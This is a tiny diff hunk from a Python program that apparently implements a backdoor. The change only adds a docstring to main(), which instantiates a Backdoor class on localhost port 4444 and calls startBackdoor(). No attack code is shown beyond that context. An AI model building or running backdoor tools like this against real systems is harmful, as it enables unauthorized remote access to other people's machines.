@@ -246,6 +246,8 @@ class Backdoor:
 
                 
 def main():
+    """The main function"""
+    
     backdoor = Backdoor('localhost',4444)
     backdoor.startBackdoor()
 
